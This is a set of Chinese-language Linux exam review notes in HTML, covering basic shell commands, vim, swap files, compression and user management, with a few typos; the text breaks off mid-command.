        <content type="html"><![CDATA[<h2><center>Linux 知识点汇总</center></h2>[TOC]<h4 id="P4-Linux的基本特征-8个"><a href="#P4-Linux的基本特征-8个" class="headerlink" title="P4: Linux的基本特征 8个"></a>P4: Linux的基本特征 8个</h4><ul><li><strong>开放性</strong>：系统遵循世界标准规范，特别是遵循开放系统互连(OSI) 国际标准 </li><li><strong>多用户</strong>：系统资源可以被不同的用户各自拥有使用。每个用户对自己的资源有特定的权限，互不影响。</li><li><strong>多任务</strong>：计算机同时执行多个程序，而且各个程序的运行互相独立。Linux系统调度每一个进程平等地访问微处理器</li><li><strong>快速性</strong>：Linux 不大在意CPU的速度，它可以把处理器的性能发挥到极限</li><li><strong>安全性</strong>：Iinux 采取了许多安全技术措施，包括对读、写进行权限控制，带保护的子系统、审计跟踪、核心授权等，这为网络多用户环境中的用户提供了必要的安全保障</li><li><strong>网络性</strong>：Linux 是在Internet的基础上产生并发展起来的，因此，完善的内置网络是Linux的一大特点。</li><li><strong>移植性</strong>：Linux能够在从微型计算机到大型计算机的任何环境中和任何平台上运行。</li><li><strong>兼容性</strong>：Linux是一款与POSI (Portable Operating System Interface)相兼容的操作系统，它所构成的子系统支持所有相关的ANSI、ISO、 IETF 和W3C业界标准。</li></ul><h4 id="P25-26-关机与注销"><a href="#P25-26-关机与注销" class="headerlink" title="P25-26: 关机与注销"></a>P25-26: 关机与注销</h4><ol><li><p>从图形界面关机：右上角齿轮</p></li><li><p>从命令行关机</p><ul><li><p><strong>关机命令 shutdown</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># shutdown //要等待一会儿</span><span class="token comment"># shutdown +5 //5min后关机</span><span class="token comment"># shutsown 19:20 //19：20关机</span>-f/-F 重新启动时执行/不执行fsck-k 仅送出信息给所有用户，不会实际关机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>注销命令 exit</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">exit</span> <span class="token punctuation">[</span>状态值<span class="token punctuation">]</span>// <span class="token number">0</span>表示执行成功，其他值表示失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>重启命令 reboot</p><pre class="line-numbers language-none"><code class="language-none">-d 重启时不把数据写入记录文件-n 重开机前不检查有未结束的程序-w 仅测试不重启，把数据写入记录文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ol><p><strong>（第三章 考试重点）</strong></p><h4 id="P57-Shell常用特殊符号-7个"><a href="#P57-Shell常用特殊符号-7个" class="headerlink" title="P57: Shell常用特殊符号 7个"></a>P57: Shell常用特殊符号 7个</h4><ul><li>“ ***** “ 表示一个(包括空字符)或多个字符组成的字符串</li><li>“ <strong>?</strong> “ 表示单个字符</li><li>“ <strong>[]</strong> “ 用于指定显示内容范围</li><li>“ <strong>!</strong> “ 用于指定不显示内容，与” <strong>[]</strong> “一同使用</li><li>“ <strong>;</strong> “ 用于同一行中分隔多个命令</li><li>“ <strong>`</strong> “ 命令替代符，包含内容在Shell中为一条命令，并被执行</li><li>“ <strong>#</strong> “ 注释符号，该行内容不被执行</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> -l /bin/e*  //查看/bin目录下的e开头的所有文件和文件夹<span class="token function">ls</span> -l /bin/e？ //查看e开头，长度为2的所有文件和文件夹<span class="token function">ls</span> <span class="token punctuation">[</span>a-c<span class="token punctuation">]</span>  //为a b c的文件和文件夹<span class="token function">ls</span> <span class="token punctuation">[</span><span class="token operator">!</span>a-c<span class="token punctuation">]</span>     //显示名不为为a b c的文件和文件夹<span class="token function">ls</span> -l  //显示目录下的文件和文件夹和查看其详细信息<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -l<span class="token variable">`</span></span>  //字符串输出为指令执行结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P57-Shell常用操作-4个"><a href="#P57-Shell常用操作-4个" class="headerlink" title="P57: Shell常用操作 4个"></a>P57: Shell常用操作 4个</h4><ul><li><p>自动命令补全功能 ——TAB键</p></li><li><p>自动输入历史命令 ——history命令</p></li><li><p>重定向</p><p>  让用户从文件输入命令，或将输出结果存储在文件及设备中，不需要输入输出设备</p><ul><li>输出重定向符**”&gt;”(写入并覆盖)<strong>和</strong>“&gt;&gt;”(追加)**，输入重定向符”&lt;”</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> -l <span class="token operator">></span> <span class="token builtin class-name">test</span> //将执行结果写入test文件中，没有test就自动创建//显示器无结果表示重定向成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>管道</p><blockquote><p>管道是一种通信机制，是一种特殊文件，可以进行读写。</p></blockquote><blockquote><p>除首尾的两个命令，每一个命令的输入都来自前一个命令的输出</p></blockquote><blockquote><p>“ <strong>|</strong> “ 将多个简单命令结合在一起，实现复杂的功能</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> -l <span class="token operator">|</span> <span class="token function">grep</span> <span class="token builtin class-name">test</span> //查看当前目录下test的详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P61-Shell常用命令-10个"><a href="#P61-Shell常用命令-10个" class="headerlink" title="P61: Shell常用命令 10个"></a>P61: Shell常用命令 10个</h4><p>（第四题考 书上命令要很了解）</p><ul><li><p><strong>ls 查看指定工作目录下的内容</strong></p><blockquote><p style="color:blue;">ls [选项] [路径]</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> -a/-A 显示所有文件及目录，列出/不列出隐藏文档<span class="token punctuation">(</span>隐藏文档名称开头有<span class="token string">"."</span><span class="token punctuation">)</span><span class="token function">ls</span> -l 除文件名外，显示详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>pwd 查看当前工作目录的绝对路径</strong></p></li><li><p><strong>uname 查看当前系统内核信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">uname</span> 显示内核名<span class="token function">uname</span> -r 显示内核版本号<span class="token function">uname</span> -o 显示系统信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>cd 切换目录</strong></p><blockquote><ul><li><p style="color:blue;">cd [路径]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> / //切换到/目录<span class="token builtin class-name">cd</span> ~ //切换到当前用户主目录<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span> //切换到上一级目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>cat 显示文件内容</strong></p><blockquote><ul><li><p style="color:blue;">cat [选项] [文件] </p></li></ul></blockquote></li><li><p><strong>clear 清屏</strong></p></li><li><p><strong>sudo 切换用户身份执行</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token variable">$sudo</span> adduser Me //以root用户运行adduser命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>su 切换用户</strong></p><blockquote><ul><li><p style="color:blue;">sudo    [选项] [命令]    </p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token variable">$sudo</span> <span class="token function">su</span> root //切换到root用户<span class="token comment">#su Me //切换到Me用户</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>ifconfig 显示和配置网络设备属性</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">interface 网络接口的名称，如eth0<span class="token punctuation">(</span>网卡<span class="token punctuation">)</span> <span class="token function">ifconfig</span> eth0 //查看eth0的网络情况<span class="token function">ifconfig</span> eth0 up/down //激活或关闭eth0<span class="token function">ifconfig</span> eth0 <span class="token number">192.168</span>.0.25 netmask <span class="token number">255.255</span>.255.0 //设置eth0的IP地址和子网掩码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>man 系统帮助(命令的详细内容和使用方法)</p><blockquote><ul><li><p style="color:blue;">man [命令名]</p></li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">man ls &#x2F;&#x2F;查看ls命令的详细内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="P65-96-编辑器-2个"><a href="#P65-96-编辑器-2个" class="headerlink" title="P65-96: 编辑器 2个"></a>P65-96: 编辑器 2个</h4></li></ul><p>(编辑器的基本使用，考察，至少知道哪个是编辑器)</p><p><strong>1.Gedit编辑文档</strong></p><p>窗口四个部分：菜单栏、工具栏、文档编辑栏、状态栏</p><p>菜单栏：文件、编辑、查看、搜索、工具、文档、帮助</p><ul><li>文件：新建、打开、保存、保存为、还原、打印预览、打印、关闭、推出</li><li>编辑：撤销、重做、剪切、复制、粘贴、删除、全部选中、插入日期和时间、首选项</li><li>查看：……</li></ul><pre class="line-numbers language-none"><code class="language-none">gedit test.cpp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>“+” 前台运行</p><p>“&amp;” 后台运行，进入自己的编辑器 </p></blockquote><p><strong>2.VIM的使用和配置</strong></p><p><strong>3种工作模式：输入模式、指令模式、底行模式</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">vim</span> <span class="token builtin class-name">test</span> //光标置于最后一行<span class="token function">vim</span> n <span class="token builtin class-name">test</span> //光标置于第n行<span class="token function">vim</span> pattern <span class="token builtin class-name">test</span> //光标置于第一个与pattern匹配的串处<span class="token function">vim</span> -r <span class="token builtin class-name">test</span> //发生系统崩溃，恢复文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>只读模式切输入模式</p><pre class="line-numbers language-none"><code class="language-none">i 光标前(光标在第一行第一列)a 光标后(光标在第一行第二列)I 当前行首A 当前行尾o&#x2F;O 当前行之下&#x2F;上新开一行r 替换当前字符……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>输入模式切指令模式 <strong>Ecs键</strong></p><pre class="line-numbers language-none"><code class="language-none">移动光标类指令：光标上移一行 k ; 光标下移一行 j光标左移一字符 h ; 光标右移一字符 l……屏幕翻滚类指令：Ctrl+u 文件首翻半屏……复制、删除、粘贴类指令：……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>指令模式切底行模式  <strong>: 或 ? 或 /</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;pattern 从光标开始处向文件尾搜索pattern?pattern 从光标开始处向文件首搜索pattern:w 保存  :x 保存并退出  :q 退出  :! 强制退出:q! 不保存文件并退出:wq 保存并退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><strong>VIM配置</strong></p><p>定制VIM编辑器属性方便编写文档，配置文件地址为/etc/vim/vimrc，该文件会在启动时读取，该命令为底行模式命令，命令写入文件后使用时不必重复键入命令</p><p>更新最新vim版本(vim,vim-common,vim-doc,vim-runtiem)，切换到root权限下，打开vim配置文件(vim /etc/vim /vimrc)，将需要命令前的注释键#删除。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">syntax on 关键字高亮<span class="token builtin class-name">set</span> <span class="token assign-left variable">tabstop</span><span class="token operator">=</span><span class="token number">4</span> 按下tab键跳跃4个光标<span class="token builtin class-name">set</span> <span class="token assign-left variable">background</span><span class="token operator">=</span>dark 更改背景为深色……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P77-挂载"><a href="#P77-挂载" class="headerlink" title="P77: 挂载"></a>P77: 挂载</h4><p>挂载：在Linux或UNIX系统中，<strong>任何个种类的文件系统被创建后，都需要挂载到某个特定的目录才能使用，这个过程相当于激活一个文件系统</strong>，使它能够被使用。</p><p>Linux使用<strong>mount工具</strong>来对文件系统进行挂载。挂载文件系统时需要明确挂载点，比如在安装Ubuntu的过程中，读者实际上已经接触过挂载的过程了，在创建文件系统后，操作系统会提示将此文件系统挂载至哪个位置，而这个位置就是挂载点，在那个时候，通常都选择挂载点为“/”，即根目录。此外，还可以利用该工具挂载其他种类的文件系统，也需要涉及挂载点的选择，挂载点的实质是一个空置的目录。</p><p>Windws文件系统的挂获原理是将磁盘分成若干分区，在各个分区中挂载文件系统。而Linux的挂载原理与Windows不同，它是将磁盘空间挂载在一个目录下。</p><h4 id="P81-swap交换分区"><a href="#P81-swap交换分区" class="headerlink" title="P81: swap交换分区"></a>P81: swap交换分区</h4><ul><li><p>什么是交换分区？</p><ul><li>在Linux中，交换分区是“虚拟内存”技术的集中体现。它代替了Windows中交换文件的概念，但实质都是<strong>利用硬盘空间，临时当作内存使用</strong></li><li>虚拟内存在功能上突破了物理内存的限制，是程序可以操纵大于实际物理内存的空间，更重要的是，虚拟内存是隔离每个进程的安全保护网，可以使每个进程都不受其他程序的干扰</li></ul></li><li><p><font color=Brown>怎么交换？有什么功能？交换多少合适？</font></p><ul><li><p>当系统的物理内存不够用的时候，才进行分区的交换。将物理内存中的一部分空间释放出来，以供当前运行的程序使用，被释放的空间的程序被临时保存到交换分区中，等到那些程序要运行时，再从交换分区中恢复保存的数据到内存中。被释放的空间可能来自一些很长时间没有什么操作的程序。</p></li><li><p>分配太多的交换分区会浪费磁盘空间，而交换分区太少，系统则会发生错误。通常情况下，交换分区应<strong>大于或等于物理内存的大小</strong>，最小<strong>不应小于64M</strong>，通常交换分区得大小应是物理内存(虚拟机的)得<strong>2~2.5倍</strong>。</p><blockquote><ul><li><p>不是所有物理内存中交换出来的数据都会被放到交换分区中，会导致不堪负重，有相当一部分数据会被直接交换到文件系统，如文件读写</p></li><li><p>交换分区是”匿名“内存数据的交换空间。”匿名“内存数据如malloc和new函数生成的对象的数据，以及堆栈中一些状态和变量数据等。malloc和new函数生成的对象的数据，即人为在内存上进行的空间操作，它们在文件系统中没有相应的”存储“文件，需要交换分区。</p></li></ul></blockquote></li></ul></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># swapon -s //查看当前系统的交换分区情况</span>Filename表示当前交换分区挂载的位置，Type表示该分区的文件格式，partition表示交换分区，/dev/sda5表示第一块硬盘的第一个扩展分区的第一个逻辑磁盘/dev/hda, /dev/hdb, /dev/sda, /dev/sdbhda一般是指IDE接口的硬盘，hda指第一块硬盘，hdb指第二块硬盘,等等；sda一般是指SATA接口的硬盘，sda指第一块硬盘，sdb指第二块硬盘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>交换分区的数量对性能有很大的影响。因为分区的交换操作是磁盘I/O的操作，多个交换分区可以轮流使用，均衡I/O的负载，而单一交换分区会很忙使系统大多数时间处于等待状态，效率很低。系统很慢，但CPU不忙，说明问题在I/O上。</li></ul><p><strong>交换分区的管理</strong></p><p>交换分区是分页管理的，每一页的大小和内存也得大小一样，以方便数据交换。</p><blockquote><p>旧版本实现交换分区，用交换分区第1页作为所有交换分区的一个”映射“，即第1页的每一位都对应一页交换分区。如果这一位是1，表示此页可用；如果这一位是0，表示此页是环块，不可用。</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">vmstat</span> <span class="token number">3</span>  //每3秒捕获一次系统性能指标Procs下的r表示正在等待的进程数量（等待块），b表示输入输出Memory下的swpd表示使用的Swap空间的大小Swap下的si表示系统的交换回内存的总量，so表示CPU每秒交换总量以上指标的数值越大，表示系统越繁忙，其繁忙程度与系统具体的配置有关。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230209224236885.png"></p><p><font color="red"><strong>交换分区常用管理方法</strong></font> </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span>.切换为超级用户（管理员），cd到/root目录下<span class="token function">sudo</span> <span class="token function">su</span> root<span class="token builtin class-name">cd</span> /root<span class="token number">2</span>.创建一个swap文件（有连续空间的），其路径为/root/swapfile<span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>/dev/zero <span class="token assign-left variable">of</span><span class="token operator">=</span>/root/swapfile <span class="token assign-left variable">bs</span><span class="token operator">=</span><span class="token number">1024</span> <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">65536</span><span class="token punctuation">(</span>ls //存在一个snap和swapfile文件<span class="token punctuation">)</span><span class="token number">3</span>.格式化swap分区<span class="token function">mkswap</span> swapfile //将刚才建立的/root/swapfile文件格式化为swap格式<span class="token number">4</span>.激活swap分区<span class="token function">swapon</span> swapfile<span class="token number">5</span>.检查刚建立的交换分区文件是否存在<span class="token function">swapon</span> -s<span class="token number">6</span>.回收/root/swapfile文件所占用的交换空间swapoff swapfile<span class="token number">7</span>.删除/root/swapfile文件<span class="token function">rm</span> swapfile<span class="token punctuation">(</span>永久创建 <span class="token function">vim</span> /etc/fstab<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P88-91-压缩和解压-3个"><a href="#P88-91-压缩和解压-3个" class="headerlink" title="P88-91: 压缩和解压 3个"></a>P88-91: 压缩和解压 3个</h4><ul><li><p><strong>zip和unzip</strong></p><ul><li><p>zip命令一般解压有规则特征的应用程序</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">zip</span> -m abc.zip a b c //-m:压缩后，删除原始文件<span class="token punctuation">(</span>将文件移入压缩文件<span class="token punctuation">)</span> <span class="token function">zip</span> -r test.zip test/ //-r:递归处理，压缩指定目录下的所有文件和子目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>unzip解压</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">unzip</span> abc.zip //直接解压，压缩文件依然存在<span class="token function">unzip</span> -d test1 abc.zip //-d<span class="token operator">&lt;</span>目录<span class="token operator">></span>:指定文件解压后的存储目录，没有的话新建<span class="token function">unzip</span> abc.zip -x a //-x<span class="token operator">&lt;</span>文件<span class="token operator">></span>：指定压缩文件中不解压的文件<span class="token function">unzip</span> -l abc.zip //-l:显示压缩文件所包含的文件<span class="token function">unzip</span> -Z abc.zip //-Z:显示压缩文件中文件的具体信息，不解压<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>tar解压规则/不规则程序</strong></p><p>（1）-cvf：文件归档但不压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps15.jpg" alt="img" style="zoom: 67%;" /> </center>（2）gzip压缩和解压缩 -z</li></ul><p>-c：压缩；-x：解压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps16.jpg" alt="img" style="zoom: 67%;" /> </center>  <center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps17.jpg" alt="img" style="zoom:67%;" /> </center>（3）bzip2压缩和解压缩 -j<p>-c：压缩；-x：解压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps18.jpg" alt="img" style="zoom:67%;" /> </center>  <center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps19.jpg" alt="img" style="zoom:67%;" /> </center>#### P92：文件系统管理命令 6类20个<ol><li><p>文件的基本操作</p><ul><li><p><strong>touch 创建一个新文件，存在则修改文件最后修改日期</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">touch</span> <span class="token punctuation">[</span>参数<span class="token punctuation">]</span> <span class="token punctuation">[</span>文件名<span class="token punctuation">]</span><span class="token function">touch</span> a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>cp 复制一个或多个文件，也可以复制一个目录</strong></p><blockquote><ul><li><p style="color:blue;">touch [参数] [源地址] [目的地址]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">cp</span> a.cpp c.cpp //复制a.cpp到当前目录c.cpp中-v 查看复制过程-i 询问，是否覆盖原来已经存在的同名文件-r 递归处理，实现目录复制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mv 移动文件或目录，也可以进行重命名</strong></p><blockquote><ul><li><p style="color:blue;">mv [参数] [源地址] [目的地址]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">mv</span> dir1/a dir2/<span class="token function">mv</span> b bbb //b重命名为bbb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>rm 删除一个或多个文件，也可以递归删除目录</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">rm</span> dir1/bbb<span class="token function">rm</span> -ri dir1/ //递归处理来删除目录，并询问<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>目录的基本操作</p><ul><li><p><strong>mkdir 创建一个目录</strong></p><blockquote><ul><li><p style="color:blue;">mkdir [参数] [目的地址]</p></li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">mkdir dir1 &#x2F;&#x2F;当前目录下创建一个目录mkdir -p dir2&#x2F;dir22&#x2F;dir222 &#x2F;&#x2F;-p实现多层目录的建立<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>rmdir 删除一个目录</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">rmdir</span> dir1<span class="token function">rmdir</span> -p dir2/dir22/dir22 //-p实现多层目录的全部删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>查看文件内容</p><ul><li><p><strong>more 在终端屏幕按屏显示文本文件</strong></p><p>   在终端屏幕显示文本文件：Enter一行，空格一屏（如果-num有参数，显示num行），q退出</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">more</span> -8 /etc/passwd //每屏显示8行<span class="token function">ls</span> /etc/ <span class="token operator">|</span> <span class="token function">more</span> -10 //查看/etc目录的文件信息，每屏显示10行-p 实现清屏-d 显示友好信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>less 在终端屏幕按屏显示文本文件</strong></p><p>  在终端屏幕显示文本文件，不能Enter和Space翻阅，增加：鼠标滑动显示内容；底部提示符为“ : ”</p><pre class="line-numbers language-none"><code class="language-none">ls &#x2F;etc&#x2F; | less<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>head 显示前几行或几字节</strong></p>  <img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210001613397.png" alt="image-20230210001613397" style="zoom:67%;" /></li><li><p><strong>tail 显示前/最后几行或几字节</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212191142439.png" alt="image-20230212191142439" style="zoom:67%;" /><p>（head和tail这两命令同理）</p></li><li><p>od 按照特殊格式查看文件内容</p><pre class="line-numbers language-none"><code class="language-none">字码基数 -d 十进制；-o 八进制(默认)；-x 十六进制 -t 设置输出格式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>文件类型</p><ul><li><p><strong>文件类型</strong></p><p><font color="red"><strong>- 普通文件</strong>，<strong>d 目录</strong>，c 字符设备（串口设备：调制解调器），b 块设备（接口设备：硬盘、光驱），l 符号链接文件（快捷方式），s 套接口文件（网络通信文件），p 管道文件（FIFO文件，进程间通信机制）</font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210003215624.png" alt="image-20230210003215624" style="zoom:67%;" /></li><li><p><strong>file 辨识文件类型</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210001908362.png" alt="image-20230210001908362" style="zoom:67%;" /></li></ul></li><li><p>查询文件</p><ol><li><p><strong>find 在目录结构中查找文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">find</span> /etc -name vim* //查找文件名中以vim开头的所有文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>locate 查找符合条件的文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">locate</span> cpuinfo //查找含有cpuinfo的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>grep 查找包含指定关键字的文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">grep</span> -ir <span class="token string">"Ubuntu"</span> /user <span class="token operator">|</span> <span class="token function">less</span> //<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol></li><li><p>其他管理命令</p><ul><li><p><strong>ln 创建连接文件</strong></p><blockquote><ul><li><p style="color:blue;">ln [参数] [目的地址] [链接文件名]</p></li></ul></blockquote><p><font color="blue">两种链接：硬链接和软连接：</font></p><ul><li><strong>硬链接利用每个文件分配的物理编号inode建立的，因此不能跨越文件系统。修改硬链接的目标文件名，链接依然有效；</strong></li></ul></li></ul></li></ol><ul><li><strong>软连接利用文件路径名建立链接，通常为绝对路径，增加可移植性。修改软链接目标文件名，链接将断开</strong> <img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210002324999.png" alt="image-20230210002324999" style="zoom:67%;" /></li><li><strong>wc 统计文件的字数、字节数、行数等信息</strong></li></ul>  <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">   <span class="token function">wc</span> -c 字节<span class="token function">wc</span> -l 行数   <span class="token function">wc</span> -w 字数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code> &lt;img src=&quot;https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212191405117.png&quot; alt=&quot;image-20230212191405117&quot; style=&quot;zoom:67%;&quot; /&gt;</code></pre><ul><li><strong>comm 逐行比较两个<font color="blue">已排序</font>文件的差异，并显示</strong></li><li><strong>diff 逐行比较文本文件的异同处</strong>逐行比较文本文件的异同处。指定比较目录，会比较相同文件名的文件，不会比较子目录</li></ul><h4 id="P105-Ubuntu用户系统概述"><a href="#P105-Ubuntu用户系统概述" class="headerlink" title="P105: Ubuntu用户系统概述"></a>P105: Ubuntu用户系统概述</h4><p>Ubuntu Linux系统是一个<font color="red">多用户、多任务的分时</font>操作系统</p><p><font color=Brown>Ubuntu用户类型:  3个</font></p><ul><li><font color=Brown>初次创建的用户：完成比普通用户多的功能</font></li><li><font color=Brown>root用户 #：系统管理员，完成对系统的所有管理功能，拥有最高权限</font></li><li><font color=Brown>普通用户 ~：在安装完操作系统后，被创建的其他所有用户</font></li></ul><p>查看各个用户的相关信息：<strong>配置文件/etc/passwd</strong></p><p><strong>记录当前操作系统中所有用户的基本信息：用户名、用户UID、用户组ID(GID)、主目录路径、登录Shell等。</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210004522336.png" alt="image-20230210004522336" style="zoom:67%;" /><h4 id="P113-用户管理命令"><a href="#P113-用户管理命令" class="headerlink" title="P113: 用户管理命令"></a>P113: 用户管理命令</h4><p>sudo和su的配置文件 /etc/sudoers</p><ol><li><p><font color=Brown><strong>添加用户 adduser</strong></font></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># adduser abc //添加一个名为abc的普通用户</span><span class="token comment"># adduser --system --home /home/xyz --shell /bin/bash xyz //添加一个名为xyx的系统用户，指定主目录为/home/xyz，默认shell为bash</span><span class="token punctuation">(</span>ls /home -<span class="token operator">></span> abc xyz<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>显示用户信息  finger</strong></font></p><p>finger命令用于查找用户，并显示对应用户的相关信息</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># sudo apt install finger</span>finger -l abc  //列出用户abc的详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>更改用户密码 passwd</p><p>passwd命令用于更改用户密码。如果当前用户为普通用户，只更改自己密码；当前用户为超级管理员，能更改所有用户密码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">passwd</span> abc //更改用户abc的密码<span class="token function">passwd</span> -d abc //删除用户abc的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>修改用户登录信息 usermode</strong></font></p><p>usermode命令用于修改已添加到系统中的某个用户的登录名、主目录、默认shell等与登录相关的信息</p><pre class="line-numbers language-none"><code class="language-none">usermode -l abcd abc &#x2F;&#x2F;将用户abc改名为abcdfinger abc &#x2F;&#x2F;查找登录名为abc的用户，不存在<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>显示用户ID id</strong></font></p><p>id命令用于显示系统中某个用户的UID、GID等识别号信号。</p><pre class="line-numbers language-none"><code class="language-none">id root &#x2F;&#x2F;显示用户root的所有IDid -u abc 